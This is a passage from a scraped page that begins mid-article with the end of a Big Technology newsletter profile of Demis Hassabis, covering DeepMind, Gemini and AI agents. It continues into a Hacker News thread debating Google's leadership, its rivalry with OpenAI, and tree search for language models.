Google’s product focus could distract from the broader AGI aims. Or perhaps because of simple tribalism. Either way, after inventing the transformer model, Google’s two AI teams didn’t immediately capitalize on it. “I got in trouble for collaborating on a paper with a Brain because the thought was like, well, why would you collaborate with Brain?” says one ex-DeepMind engineer. “Why wouldn't you just work within DeepMind itself?” DeepMind kept pushing its core research forward though. And in July 2022, its AlphaFold model predicted the 3D structures for nearly all proteins known to science. It was yet another major advance, and will likely fuel decades of drug discovery. Hassabis tells me it’s his signature project. “We've had hundreds of thousands of biologists and scientists from around the world that are now tapping that database,” DeepMind chief business officer Colin Murdoch says in a Big Technology Podcast interview. The scientists are working on everything from antibiotic resistance to malaria vaccine development. It’s a massive breakthrough. Then, a few months later, OpenAI released ChatGPT. AI War & The Future Of Google Source: Google At first, ChatGPT was a curiosity. The OpenAI chatbot showed up on the scene in late 2022 and publications tried to wrap their heads around its significance. “ChatGPT is OpenAI's latest fix for GPT-3,” read an MIT Tech review headline digesting its debut. “It's slick but still spews nonsense.” Within Google, the product felt familiar to LaMDA, a generative AI chatbot the company had run internally — and even convinced one employee it was sentient — but never released. When ChatGPT became the fastest growing consumer product in history, and seemed like it could be useful for search queries, Google realized it had a problem on its hands. Almost immediately, people began connecting it with the innovators dilemma. In spirit if not in name, a “code red” took hold within the company. Peacetime was over at Google. And in the new AI war, its first major move was to combine the rival Google Brain and DeepMind teams under the Google DeepMind banner with Hassabis at the helm. Large language models take a tremendous amount of computing to run and train, and dividing the compute between two AI research divisions would hamper their progress. So from that standpoint, a merger made practical sense. In Hassabis’s telling, AI research and products also began to collide to a point where it was logical to combine them. Whether solving protein folding leads to better search is still a bit uncertain, but Hassabis offers a worthy argument. Building a reliable science assistant, he says, would require solving AI’s hallucination problem in order to work. “If we solve that in that domain,” he says, “We could bring that into the core Gemini, and then solve it for chatbots and assistants too.” “They're like this large semi truck that’s trying to move at the pace of a Ferrari” Gemini, the product Hassabis mentions, is Google’s answer to OpenAI’s GPT models. By most expert accounts, it’s on par with OpenAI’s technology. And in February, Hassabis and Google CEO Sundar Pichai announced Gemini 1.5, a large language model with context window of up to 1 million tokens. That’s enough to handle 1 hour of video, 11 hours of audio, or ten books worth of information. An effective counterpunch. Few question Google DeepMind’s ability to produce great AI models, but those close to the company wonder whether it can navigate Google’s bureaucracy and translate that research into great products. To succeed, Hassabis will have to convince a conservative Google product organization to push his advances into production. And for a company that’s extremely hesitant to ship changes that might upset the equilibrium that’s made it successful, it’ll be no simple matter. “They're like this large semi truck that’s trying to move at the pace of a Ferrari,” says Guarav Nemade, an ex-Google product manager who worked on LaMDA. Google felt the pain acutely earlier this month as its Gemini image generator went off the rails, creating historically inaccurate images, including some portraying Nazis as people of color. It was an embarrassing episode and largely a product of organizational dysfunction. When I asked my sources what Hassabis had to do be successful, nearly all wanted to know whether Google would give him the remit to push dramatic — even painful — changes within the company’s products to move AI forward. Hassabis tells me he’s still on the research side and not sitting in product meetings, but that his work is now deeply entwined with Google’s product organization. “We’re increasingly connected with the product units,” he says. “There's been a huge demand in the last couple of years for brainstorming ways those technologies can help with the product features.” AI’s Next Step As chatbots expand beyond conversational partners — becoming agents that take action on our behalf — Hassabis’s fundamental research is poised to play a leading role. OpenAI is already developing agent software that autonomously takes action, and Hassabis says DeepMind is working heavily on this too. “We were steeped in agents from the beginning, right? That’s what all of our games work is,” he says. “We believe that agent systems are actually what you need for intelligence.” Just like AlphaGo mapped out its environment using Hassabis’s beloved reinforcement learning, AI agents could use similar technology to map out our world and take action on their own. It’s a big step beyond today’s conversational models, which require users to initiate the interaction and only then deliver information. When Hassabis talks about the possibilities of this full circle moment, he lights up. “We believe that agent systems are actually what you need for intelligence.” “The next step is for these systems to do things for you, solve things for you, book holidays, restaurants, whatever. You can give them goals, and so on,” he says. “We're experts in doing that.” If Hassabis nails the assignment, he may face new questions, including whether he should run Google itself, not just its AI research. Success here would mean returning Google to AI leadership, a feat given where it stands today. Many of those who know Hassabis pine for him to become the next CEO, saying so in their conversations with me. But they may have to hold their breath. “I haven't heard that myself,” Hassabis says after I bring up the CEO talk. He instantly points to how busy he is with research, how much invention is just ahead, and how much he wants to be part of it. Perhaps, given the stakes, that’s right where Google needs him. “I can do management,” he says, ”but it's not my passion. Put it that way. I always try to optimize for the research and the science.” Douglas Gorman contributed reporting Share WorkOS, the modern identity management for B2B SaaS (sponsor) WorkOS provides flexible and easy-to-use APIs for authentication, user identity, and complex enterprise features like SSO and SCIM provisioning. Recently, WorkOS had its first launch week, unveiling exciting new features like Sessions, Roles, and Impersonation to provide a complete user management platform for modern apps. It's a drop-in replacement for Auth0 and supports up to 1,000,000 monthly active users for free. Learn More What Else I’m Reading, Etc. The Atlantic has 1 million subscribers and is profitable [WSJ] Top podcasters are gaming the charts by trading mobile game points for follows [Bloomberg] Podcaster Andrew Huberman had multiple relationships in parallel [New York] The U.K. marks its wealth of unicorns with an ever-changing statue [Venturebeat] New York prisons will lock down during the solar eclipse [Hell Gate] Quote Of The Week He will never own a home or have a retirement account ,and in some states, he’ll never vote. He will forever be scrutinized by the federal government. SBF will never work in his industry again. It’s unlikely he’ll ever hold an officer position unless it’s within his own company, which, if he manages to build, would have a lien placed against it by the government, particularly if it has tangible assets. A white collar criminal’s note about what Sam Bankman Fried faces from here Number of The Week 25 Years in prison Sam Bankman Fried was sentenced to this week after scamming FTX users. He was also ordered to forfeit $11 billion. The Yahoo Episode — With Jim Lanzone Jim Lanzone is the CEO of Yahoo. He joins Big Technology Podcast for the long awaited Yahoo Episode, a deep dive into a company that remains one of the most visited and influential property on the web. Tune in as Lanzone describes how Yahoo's verticals operate, how the company thinks about generative AI for its search bar, and whether it's still possible to build a solid business on the web. Ranjan Roy joins us as well for a rare Wednesday appearance on the podcast. Tune in for a deep, engaging conversation with a CEO at the helm of a crucial internet cornerstone. You can listen on Apple, Spotify, or wherever you get your podcasts. Send me news, gossip, and scoops? I’m always looking for new stories to write about, no matter big or small, from within the tech giants and the broader tech industry. You can share your tips here I will never publish identifying details without permission. Advertise with Big Technology? write alex@bigtechnology.com or reply to this email to learn more Thanks again for reading. Please share Big Technology if you like it! And hit that Like Button if you like high quality journalism like this My book Always Day One digs into the tech giants’ inner workings, focusing on automation and culture. I’d be thrilled if you’d give it a read. You can find it here. Questions? Email me by responding to this email, or by writing alex.kantrowitz@gmail.com News tips? Find me on Signal at 516-695-8680 Subscribe to Big Technology Hundreds of paid subscribers A newsletter about big tech and society by independent journalist Alex Kantrowitz. Subscribe Error 45 Share this post Can Demis Hassabis Save Google? www.bigtechnology.com Copy link Facebook Email Note Other Share Previous",
    "commentLink": "https://news.ycombinator.com/item?id=39866795",
    "commentBody": "Can Demis Hassabis save Google? (bigtechnology.com)128 points by laurex 15 hours agohidepastfavorite117 comments andy_xor_andrew 14 hours agoGiven his experience with AlphaGo/Star/Zero/etc, I'm sure if there's any way to apply tree search, or policy networks, to LLMs, Demis will find it. I've always found it strange that a LLM is basically an action/value model that scores all next possible actions (tokens), and yet we DON'T traverse it like a tree. Well, \"beam search\" exists, but that's kind of the most naive approach. Then again, I'm not smart, and lots of very smart people are thinking nonstop about LLMs, and no type of tree search has become widely used, so maybe there's really nothing there. reply dbmikus 14 hours agoparentI think part of the problem for LLMs is that they don't operate in an easily scoreable \"game\". We can make them work well for optimizing next token(s) log likelihood, but how do we judge quality of the output for the task it was made for? Then after that, there are other challenges, such as do LLMs have a world model that lets them think how to attain a reward? Wherever you can have an automated feedback mechanism, you can start to address the first problem and allow for the AI to explore more of the \"tree\". These are situations like coding (you can run the code and evaluate the output), or situations where you can let the LLM crowd-source user feedback. For models that have some actual world model, who can reason across modalities, and who can plan, LeCunn talks about this often. The videos/slides here[1] were good content. [1]: https://www.ece.uw.edu/news-events/lytle-lecture-series/ reply user_7832 13 hours agorootparentI personally feel like these problems can be broken into two types - one where the output is expected/deterministic, and one where creativity is a virtue. Asking Siri what the current temperature is (only 1 correct answer) is an example of the former, but asking chatGPT to write an email is closer to the latter. Tree type algorithms are better when you don't have (millions of english words)^10 for a 10 word response, and where there are multiple \"correct\" answers. reply roenxi 10 hours agorootparentprevQualitatively, the answer seems to be to train for novelty. Which happens to also be how humans accomplish much of the complex stuff. Eg, One interpretation of art is we have 8 billion or so humans with a finely trained neural net for recognising stuff. The artist is looking for novel ways of triggering those nets, and if they find something inspired then it is art. A great artist generally isn't trying to reproduce something that is known, they're trying to explore novel areas of a medium. So the real trick to building the world model is coming up with a good novelty metric. Still hard, but easier than developing a reward function. That gets the part of the training done that establishes a world model, then I'd assume it is possible to train that model to do a task by rewarding specific outcomes that it already knows how to achieve. reply Zambyte 13 hours agorootparentprev> I think part of the problem for LLMs is that they don't operate in an easily scoreable \"game\". Unfortunately \"social media\" is the gamified environment for language. reply Jensson 13 hours agorootparentBut it has human voters, you can't train a model using human voters to vote during iterations, and AI aren't good enough to replace human voters. Not sure if AI voters even can result in a model smarter than the voting model. reply Zambyte 12 hours agorootparent> you can't train a model using human voters to vote during iterations Why not? Just comment multiple times on a post in different ways. Score outputs with more of a desired response higher than outputs with less desired responses. Scale that up site-wide on multiple sites, and it seems like you have a pretty powerful way to get human feedback... reply Jensson 12 hours agorootparentThese models trains on billions of examples, having bots posting billions of posts on different social media sites every time you train a new model probably isn't a viable strategy. You would get banned real quick since most of those will be really low quality in the early stages. reply Zambyte 11 hours agorootparentI think we're simply talking about different things. Obviously you wouldn't want to start with a model of pure noise when interacting with real humans like that. I am describing using RLHF to fine tune existing models. That is a way to gamify training. reply vineyardmike 11 hours agorootparentprevSo I agree with your overall sentiment, BUT we already have good LLMs, so I think we’ve crossed the bridge from “bad low quality responses in the beginning” and I also suspect there’s more Social Media bots than we’d like to admit. reply visarga 14 hours agorootparentprevYes, whatever is not written in any books, AI will have to learn directly from the feedback generated by the environment to its actions. AlphaZero discovered go from scratch, and beat us who invented the game and had thousands of years to practice it. This is how powerful a teacher can be the environment. reply dontupvoteme 12 hours agorootparentprevI mean you can make any set of LLMs produce any set of output you want. The problem is that it isn't terribly efficient and you have to filter between the real stuff and the hallucinations. reply snats 13 hours agoparentprevIt's been pretty interesting to see some research trying to solve this. For example, Stanford researchers recently published QuietSTaR[1]. This makes LLMs \"think\" before they speak. By generating a chain of thoughts and just choosing the best possible path from the generated thoughts. This method is better than Chain of Thought and I think is a step in the right direction. [1] https://arxiv.org/abs/2403.09629 reply pama 13 hours agoparentprevI’ve wondered about the same point for a long time. In smaller language models of chemistry the tree search in decoding has made a huge difference [1]. If the training data set doesn’t include the right conditioning it may be hard for the LLM to learn to associate high probability answers with more useful answers, however, this seems like a solvable problem for many subdomains. [1] search for branch-and-bound in: https://pubs.acs.org/doi/10.1021/acs.jcim.0c00321 reply brrrrrm 13 hours agoparentprevTree decoding exists and is being worked on by multiple groups. At the end of the day tree based methods are still just injecting some kind of interpretable prior. reply hiddencost 12 hours agoparentprevBeam search can be optimized incredibly aggressively on hardware. Check out finite state transducers. reply vlovich123 13 hours agoprev> “I haven't heard that myself,” Hassabis says after I bring up the CEO talk. He instantly points to how busy he is with research, how much invention is just ahead, and how much he wants to be part of it. Perhaps, given the stakes, that’s right where Google needs him. “I can do management,” he says, ”but it's not my passion. Put it that way. I always try to optimize for the research and the science.” Sundar makes ~200M as the CEO of Google whereas DeepMind sold for ~400-650M. There's plenty of monetary incentive to take the job, not to mention more power to set the company direction through resource allocation. And it's clear that there's been a PR campaign being set up to push out Sundar. Maybe Hassabis is a contender because he's been getting some pretty serious press since the beginning of the year (which is when the Sundar article grumblings started). reply tdullien 13 hours agoparentYou don't need a PR campaign to oust Sundar. I think 7 out of 10 Googlers would agree that Sundar is uninspiring and has allowed the erosion of most of what was good about Google's culture. I left partially because I hated the feeling that \"this year will be average - meaning worse than last year but better than next year\". Slow downward drift, culture erosion, lack of leadership, lack of clarity, etc. Management isn't leadership, and Sundar is more of a manager than a leader. reply jillesvangurp 11 hours agorootparentMy impression from the outside is indeed that the man is a problem. And part of the problem is that the problem is allowed to continue to exist by the Alphabet board. Which means the real problem is over there. They are just looking at the stock price, which is of course fine. Until it isn't. I think the whole point of Sundar always was that he's very obviously not a leader. He's a care taker. I used to work in a big multi national (Nokia) with a care taker CEO (Olli Pekka Kallasvuo) who took over from the man that grew Nokia from a large but insignificant Finnish company to the smart phone behemoth it was around 2005 (Jorma Ollila). Kallasvuo presided over the emergence of the Apple's iphone and Google's Android as the two new competitors that ultimately killed it off. And did nothing whatsoever about it. The man was a bean counter whose job it was to protect the stock price. By the time the Nokia board (under leadership of the former CEO, Ollila) appointed a new CEO (Stephen Elop, an MS executive) with the clear intention to orchestrate some collaboration with and the eventual takeover by MS, it was already too late. Nokia flailed for a few years and MS eventually pulled the plug a year after acquiring what remained of the phone business unit for next to nothing. By then the stock price had tanked, market share was in the gutter, and the value was gone. Everything the board thought they knew about smart phones was no longer relevant. Ollila got removed from the board in the aftermath. People blame CEOs, but it's the boards of these companies that appoint these CEOs, protect them, and decline to fire them when they fail. That's where the problems are. Nothing changes until you fix the boards. It's always fixable with the right people and leadership. Just look at MS post Ballmer. In Alphabet's case, the two founders are on the board and they are the ones that put Sundar in their place. Maybe it's time for them to move on? Of course the issue is that they have a lot of shares (class B) in Alphabet. Institutional investors have about 35% of the class A shares and the rest is publicly traded. So, nothing happens until the stock nosedives. By which time it might be too late. reply pas 6 hours agorootparentof course, but boards are largely impotent. they are too far from the action, don't want to rock the boat even more when things are not going great, and of course management easily bamboozles them with some fancy plan ... but in the end there's nothing they can do, except fire the management. but it requires risk taking, and it's a collective action problem ... so if there's a majority shareholder, maybe.. but usually they are the CEO anyway (or appointed it) reply intexpress 8 hours agorootparentprevAgree but I think it is more like 8/10 or 9/10 of Googlers who would view Sundar as, to say the least, uninspiring. The problem is that the good internal candidates to succeed Sundar have mostly already left Google, or don’t seem interested in taking over. If Sundar left today, it could be that Ruth or TK would end up running Google for a while. That would be much, much worse. reply UncleMeat 11 hours agorootparentprevYeah if I wasn't planning on a big career shift anyway in the next 2-3 years, I'd be out the door at Google. Pay is great, I'm able to be fully remote, and it isn't too stressful to do my day job - but the company feels nothing like it did 10 years ago. You know how there are top down and bottom up companies? My experience at Google now is that it is neither. VPs expect bottom up work and then smash it down whenever they don't like it - but they also cannot articulate what they actually want. I'm constantly being asked to go through prioritization processes that take a ton of time and end with \"eh, every project stays at the funding level it is already at.\" reply sangnoir 10 hours agorootparentprev> You don't need a PR campaign to oust Sundar. I think 7 out of 10 Googlers would agree that Sundar is uninspiring Do Google RSUs come with voting rights? If not, then Googlers don't get much of a say on when/how Sundar is ousted - Larry and Sergei do. reply vlovich123 10 hours agorootparentIt doesn’t matter if they do. Larry and Sergei have 51.2% control through their class B shares which basically only they can hold and give them 10x votes of class A shares (i.e. RSUs). They still have to be mindful of perception of their employees with how they wield that control, but yes basically they can technically tell the board or any shareholders to go pound sand. reply jack_riminton 12 hours agorootparentprevVery well put reply strangattractor 13 hours agoparentprevMy own perception of OpenAI vs Google seems at odds with many things I read. I don't really see Google as being behind at all. 1. Google pretty much invented the technology (https://arxiv.org/abs/1706.03762) 2. In order to create the models one needs lots of compute and access to a lot of text. Google scores higher than OpenAI on both counts. 3. New models are released on a weekly basis by all sorts of companies. So OpenAI has no monopoly on LLM models. In fact their competition is staggering (NVIDIA, Meta, Google, DataBricks, Amazon (numerous other startups)) It will not be long before there are even more. It seems to me that Altman saw this all as a timing thing. Reveal your cards now and force others to do the same in the hopes of obtaining a strategic position over competitors. Googles cashflow seems to be doing just fine and I haven't had to fight off any urges to use Bing. reply vineyardmike 11 hours agorootparentYou’re missing the final point - the use case beyond Chat. Google has search, GMail, Android, Docs, Developer Tools, etc Google can put an LLM into everything and sell it. Not just a chatbot. OpenAI can sell theirs to consumers as a chat bot or an API. Google can out monetize them handily. The best thing Google can do (which it’s starting to do) is open up access to LLMs. And help everyone else do the same. Give it away and flood the internet with more LLaMAs, more Groks, more CLIPs, more Hermes, more Mistal, more SIGLIPS, etc. If they just drown out the competition, and turn good enough” models into a true commodity, they’ll dethrone OpenAI easily. Also no one mentions YouTube. Surely that data is a massive untapped opportunity. We saw the multi-modal abilities of Gemini today. A few years from now, and some better GPUs, and it might be able to handle video in real-time. reply p1esk 10 hours agorootparentNo. The best model wins. I’m currently paying $20/mo for all three leading models (GPT4, Opus, and Ultra). But in the future, when GPT5/Opus2/Ultra1.5 come out, I expect the prices to go up. So I will be choosing the best one. Whatever is on the top of the leaderboard will get my $200/mo (maybe even $2k/mo if it’s really smart). reply vineyardmike 9 hours agorootparentThis is forward looking. Models need to keep getting better. That takes research, and compute, and data. It’s not free, and it’s getting increasingly expensive. I too pay for multiple services (Gemini, Claude, CodePilot). Not everyone can or will pay $2k, or $200, or even $20 for a massive model. And most flagship models today are significantly better than models 6mo ago, which were already transformative and valuable on their own. There is a huge opportunity to market “good enough” models for tasks that don’t require the latest and greatest abilities (eg summarize this list, write an email). Arguably, we already have much smaller and simpler models for a lot of these tasks. There is a market for $20/mo assistants, but the potential market for “everything else” is much bigger - and assistants will be moving towards running locally where possible. These companies are burning billions, they’re going to need a bigger revenue prize for investors. And that’s integration of LLMs and AI into every other software product. The less of those products that run with OpenAI models, the less income OpenAI has to compete, and the harder it will be to keep up. That’s why the opportunity exists for big tech companies can flood the market with good but smaller models and ruin opportunities for cash flow to build the better models. reply p1esk 7 hours agorootparentIf the next gen of the top models improves as much as I hope they will - we will not need any integration. It will be similar to hiring a human personal assistant. But much cheaper, even at $2k/mo. Even if this doesn’t happen with GPT5, it can very well happen with GPT6 a year later. reply meragrin_ 12 hours agorootparentprev> 1. Google pretty much invented the technology (https://arxiv.org/abs/1706.03762) > 2. In order to create the models one needs lots of compute and access to a lot of text. Google scores higher than OpenAI on both counts. If a smaller company with less compute and data commercializes something before Google which has more compute and data, doesn't that mean they are behind? You don't measure a car race by fuel available in the pit and faster top speed. You measure by who gets to the finish first. It just goes to show that Google has a horrible driver. reply jonplackett 11 hours agorootparentI guess the point is this is a very long race and, actually, the end is still quite far away (if that end is AGI). In his Lex Friedman interview Altman asks ‘what has ChatGPT really fundamentally changed about the world?’ - basically making the point that they’re still just getting started. Having a tonne of compute and cash is still going to be really important in this race. You have to make it to the finish line to win. reply rvz 12 hours agorootparentprevWell said. While everyone is hyper-focused on LLMs, Google is able to do more than that and imagine what Google DeepMind has not announced yet. > It seems to me that Altman saw this all as a timing thing. Reveal your cards now and force others to do the same in the hopes of obtaining a strategic position over competitors. Googles cashflow seems to be doing just fine and I haven't had to fight off any urges to use Bing. LLMs are something that is already played out to the first movers. Google has already caught up and the moat and monopoly has been evaporated. reply laurex 12 hours agoparentprevAt some point is more money really important? My impression from meeting Demis like a decade ago is that he is an actual good person. Being a CEO of a top corporation does not seem like a good life move for someone who cares about others. There are myriad examples of how much engineers who become managers-only find it insufferable. If you're excited about thinking about the technical problems of AGI, is simply more money (or even more power) going to matter? reply VirusNewbie 11 hours agorootparentIt is very hard for me to imagine an engineer who has FU money picking a CEO position that pays hundreds of millions of dollars a year over an innovative, R&D type position that likely pays tens of millions of dollars a year. reply blueboo 12 hours agoparentprevBeware popularity in the Landsraad reply Workaccount2 13 hours agoparentprevWho would waste money on a PR campaign? Googles fumblings of the last ~5 years speak for themselves. reply vlovich123 10 hours agorootparentYou don’t need to pay money on things like this. You leverage your contacts to create profiles like this article. The newspaper gets access and you get your profile elevated. And it wouldn’t be google the company doing this but players within the company / influential and powerful shareholders etc. reply londons_explore 13 hours agoparentprev> there's been a PR campaign being set up to push out Sundar. There has been mumblings of that for the whole time he has been CEO... reply underdeserver 12 hours agorootparentGoogle has been failing continuously in user experience under his leadership: 1. Search has become an ad-riddled, clickbait SEO infested mess 2. All those naming kerfuffles (how's Allo and GSuite doing?) 3. Cloud still significantly behind AWS and Azure 4. AI stuff behind at least OpenAI and Anthropic. Applied ML stuff well behind specialized startups. 5. Pixel still not selling very well. Android still feeling like it's trying to catch up to Apple, still fragmented. 6. Layoffs everyone believed wouldn't happen until the very last second they were announced. 7. Customer support story, including toward large cloud customers, still abysmal. Etc etc. Yes, ad revenue increased and with it the share price, but ad revenue comes from having had a good product 5 years ago. To sustain it you need good products and good engineers to build them. Google is trending downward. It needs a fresh CEO. reply mrkramer 13 hours agoprevBut what is the end goal of OpenAI? Be a non-profit AI R&D leader, convert to for-profit and then sell(license) its AI tech to other companies or get acquired and then eventually devoured by Microsoft? In this shape and form OpenAI is not a threat to Google; since Google is extremely versatile, taking in consideration how fast they adapted to iPhone threat with their alternative smartphone OS(Android) and taking in consideration lack of clear long-term vision of OpenAI's leadership. reply kadushka 9 hours agoparentOpenAI is not a threat to Google OpenAI + Microsoft is a threat to Google. reply blueboo 12 hours agoparentprevOpenAI's \"end goal\" has OpenAI becoming a >$1T (100x their >$1B investment) company en route to its non-profit incarnation. Hardly benign reply pphysch 11 hours agoparentprevThis is exactly right. AI is a multiplier for the services and data moats that Google already has; the absolute value of generative AI has been greatly overstated. The gold rush (OpenAI) will end and the shovel-sellers (NVIDIA) will hurt too. reply yinser 14 hours agoprevThe smaller the team Demis has leadership on the more he can absolutely achieve but I’m worried he’ll by hamstrung with steering a goliath. reply ksec 48 minutes agoprevOff Topic: >Google’s core business is thriving, but that almost seems beside the point. I have vidid memory of a scene in Private of the Silicon Valley, where Microsoft is winning, and Apple is losing. But Steve Jobs said they have the better products. And Bill Gate replied \"It doesn't matter.\" The movie was 25 years ago at the time it finally strike me what I was so irritated about. No one gives a damn about quality, they only cares about the money. 25 Years later ( Well I thought Google were bad for more than a decade but I guess it is more accepted now. ) Google are making all the money but their products are absolutely crap. While not crap but degradation of quality is happening to Apple too. As many comments have already pointed out, AI wont save Google. Google has a leadership and culture problem along with Management issues. It is a bit like 2012 - 2017 when people were so certain Intel will continue to lead in SemiConductor with healthy profits and business. Until 2020 they realise Intel finally did fall behind and the culture and management couldn't turns things around. [1] https://www.youtube.com/watch?v=UFcb-XF1RPQ reply gradus_ad 14 hours agoprevRather than ChatGPT being a replacement for Google, I've found it complements it pretty well. Questions I never would have searched on Google because of length or complexity are well suited to ChatGPT while the sorts of things I've always gone to Google for I continue to use Google for. Also when ChatGPT spits out a few paragraphs of answer for a complex question I'm not even sure may have an answer, I have some concrete directions to pursue which translate much better to Google search than general/fuzzy complex questions. At this point saving Google doesn't require replacing the golden goose of Search but rather wrapping it with Gemini/whatever that can decide whether to give an answer it's thought up or returning tailored search results. It's much more a UX question than a deep technical one. Google has all the pieces it needs, it just needs to package them into a seamless experience. You don't need a mind like Demis' for this... reply brigadier132 14 hours agoparentI've found perplexity to be a replacement for google for 90% of my queries and i only use google now as a website index. If I have any sort of question, instead of jumping through the hoops of thinking how to structure the query in a way that fits google i just ask it naturally to perplexity and the answers it gives are correct often enough for me to use it over google. reply Tempest1981 14 hours agorootparentAnd perplexity.ai and phind annotate their results with footnotes, linking to the source of the information. reply joshstrange 13 hours agoparentprev> Rather than ChatGPT being a replacement for Google, I've found it complements it pretty well. Questions I never would have searched on Google because of length or complexity are well suited to ChatGPT while the sorts of things I've always gone to Google for I continue to use Google for. Agree, though there are things that I used to google (normally across multiple searches) that I now use ChatGPT for. For example, instead of looking up how to use 4 arguments of a cli tool and putting it together myself I just say \"Write me a sed command that replaces X with Y\" to ChatGPT. I've said this here a number of times but I've found a _crazy_ amount of value in having ChatGPT build bash one-liners or small scripts to process/parse data and give me actionable information. I know what's possible on the command line with cut/sed/awk/grep/sort/uniq/wc/etc but, with a few exceptions, I'm not proficient in writing it quickly. I can get there and in the past there were times I put in the effort to pipe together 4-10 commands to extract something important BUT I really needed to have a compelling reason or I needed to be sure it would bear fruit for me to spend that time. Nowadays I simply paste the raw logs/output/etc to ChatGPT and say \"I need to extract ABC and XYZ from that string, get a count XYZ per ABC group, sort them and get a count\" or similar. I can take logs and grab what I need out of the lines and quickly say \"here is a breakdown by minute of how many times X happened in the logs\". This may seem small to some of you or trivial but it's not for me and in the past I wouldn't have spent the time since I wouldn't be sure of the ROI (especially in the middle of a production issue) but now I can take 1-2min, get results, then decide if I should chase it further. Using this I've been able to go from \"The data is in our logs\" to \"Here is an HTML/CSS/JS file visualizing the data in realtime (on refresh)\". ChatGPT does a great job at writing the HTML/CSS/JS to graph data and in PHP I can have the PHP script run the one-liner that ChatGPT then \"embed\" that info for JS to read and graph. Yes, I'm aware of prometheus and friends and I use them but in the middle of an issue I'm not going to start writing a new prom file, write a grafana widget, and wait for new data to start rolling in especially if we have been logging it but just not sending it prometheus. Long-term I reach for prometheus but short-term I just need the data now and visualizing data in graph form can make thing obvious that no combing through logs is going to expose. reply neverokay 14 hours agoparentprevIt’s for Apple/Amazon/Google to fuck up if they can’t integrate AI into web old point o apps. When I pick up my phone, my Amazon groceries should already be bought. We are not even there yet. reply coldtea 13 hours agorootparent>When I pick up my phone, my Amazon groceries should already be bought. Why even pick up the phone? Or have one! We should stay in bed 24/7, fed through a tube controlled by AI, and watching multiple video streams in VR! Let AI think, write music and poetry, let our internet connected fridges and programmable lightbulbs experience things, let our corporate overlords govern! reply neverokay 11 hours agorootparentYes. reply realslimjd 13 hours agorootparentprevMaybe our consumption habits are different, but why would you want an AI buying your groceries? reply neverokay 11 hours agorootparentBecause I forget. reply MaanuAir 11 hours agorootparentYou’re so human after all. reply visarga 14 hours agoparentprev> Google has all the pieces it needs, it just needs to package them into a seamless experience. Google prefers it would be 2019, when LLMs were a \"remote\" threat. They don't make more ad money when people find things, they prefer to keep us searching and seeing ads. They will be dragged kicking and screaming into the future. I think AI also presents a huge threat to Meta and other social networks. We can get interactive experiences with AI now. We don't need social networks like before. I personally read as much LLM text as human text in a day because it is so clean and useful. Ads are also under threat. I think web browsers and phones will equip with a layer of \"user-agent-ai\" where the AI extracts the useful parts from the web and redisplays it for the user under their own controls. You can bet ads are not going to be shown, thrown away together with low quality content. Only AIs will read ads. Search, social and ads are going to be digested by AI and redisplayed for us. We gain control and protection. AI will form a layer of protection when going online, as the web will be crawling with AI bots trying to gain something from us. reply emporas 9 hours agorootparentThe advertisement business model of the internet for so long, 20 years plus, is indeed almost irrelevant now. It will collapse like a house of cards. We are heading into a micropayments future. Even products or services of the front pages of websites, which are displayed to users and consumers on a higher priority than others, that's irrelevant as well. Google for the record, didn't want to be reliant on ads for revenue back in 2006 or so, but they failed on the micropayment side. They couldn't achieve less than 0.05$ fee per transaction, which is huge. For micropayments even a thousand times less fee, is probably too much. reply melbourne_mat 12 hours agorootparentprevThere's an easy fix for AI transforming the output of the Internet giants into useful content for us: just block those AI apps/services. They are determined to be the interface between humans and machines because that is where you make your money. reply neximo64 14 hours agoprevIf anyone has actually used Gemini and seen how good it is, Demis has probably already saved Google. reply loudmax 14 hours agoparentGoogle's problem isn't lack of engineering talent, it's the absence of competent management. Gemini could be far ahead of GPT-4 or whatever OpenAI comes out with next. It won't matter unless they actually build a profitable business around running an AI. This should be feasible, but so far there's no indication of this happening. The infrastructure is there. The institutional knowledge and engineering talent is there. Google can do this if they return to their core mission statement: \"To organize the world's information and make it universally accessible and useful.\" This is in contrast to their current objective, which from the outside seems to be \"To maximize next quarter's ad revenue.\" I would love to see a return of the old Google. No amount of engineering skill will make up for clueless management. reply belter 13 hours agoparentprevHow good is Gemini? Because my experience of Gemini Advanced, is that would be sci-fi by the standards of 2020. Compared to LLM technology available in 2024 is pretty bad. Even before posting this comment, and just to make sure I have not been hallucinating lately, just shot a simple programming prompt into Claude, ChatGPT4 and Gemini Advanced. While the first two provided a template that worked even on first attempt, after 5 prompts Gemini Advanced can't even get the expected indent of a Python function block correct... reply sandspar 10 hours agorootparentGemini is very smart but it fundamentally can't be trusted on any non-technical topics. I talked to it about Taiwan. Gemini gave intelligent reasoning and analysis. But what a coincidence... all of its analysis was perfectly in line with US foreign policy! How unexpected! reply browningstreet 14 hours agoparentprevI've spent this week re-writing a significant document, section by section, with Gemini Advanced. It had opinions (some were offered straight, and some with caveats given other statements in my document), and readily highlighted gaps in the passages. I was impressed. I'm still doing a good portion of the human-does-writing bits, but things I'd wanted to include, but have forgotten along the way -- or which are buried in notes I didn't give to Gemini, were brought to my attention again. reply pphysch 11 hours agorootparentWhat sort of prompts do you use for this process? \"Please rewrite this: \"? reply fumar 14 hours agoparentprevI’ve slowly started to switch over to Gemini Advanced the paid tier from ChatGPT4. Longer conversations seem possible with Gemini and it has more recent information - at least for the topics I care about. reply dontupvoteme 12 hours agoparentprevWhat is it particularly good at? video at 1M tokens sounded neat, I've been very impressed with Cladue's 200k + pretty good reasoning + not lazy output at the moment. reply nabla9 11 hours agoprevSometimes the most hyped research is not the most important. Demis Hassabis was doing good research applying ML to important scientific problems. Then Google became jealous about ChatGPT and they pulled Hassabis to work with that. reply YouWhy 2 hours agoprevTL;DR: the expectation that a business can be \"saved\" by bolting AI onto an existing organization is unrealistic. Detail: My experience is that commercially viable AI requires a leadership that gets AI and can execute very careful tech/product development facing end-to-end business problems, obsess over data quality, pivot and and manage risks in a way that's subtler than shutting the whole thing down. None of these are possible when attempting to transform a pre-existing business. Consider AI and classic Google Search: in the best case scenario, AI will cannibalize on the search. In the worst case scenario, it will generate no lift. The middle ground is elusive at best. What does seem to work across pre-existing businesses is when AI is used to provide embellishments/optional upsells. But of course that's not the dramatic transformation that a lot of people not in the scene seem to be expecting. reply sys32768 12 hours agoprevI just miss Picasa. reply VirusNewbie 11 hours agoprevI would love to hear from some folks who have worked with him. The quote is interesting, that his prof would say he's \"not a magician at any one thing\". Does that mean he's not all that technical or struggles with math? Not sure how to read that. reply MattRix 10 hours agoparentI haven’t worked with him but it’s quite clear from his CV alone that he is very technical (ex. programming an entire commerical game at 17) and I doubt there are many things he struggles with. The quote you mentioned is just driving home the fact that he is an extremely high level polymath, a jack of all trades. reply az226 11 hours agoprevYou talking about Sir Demis 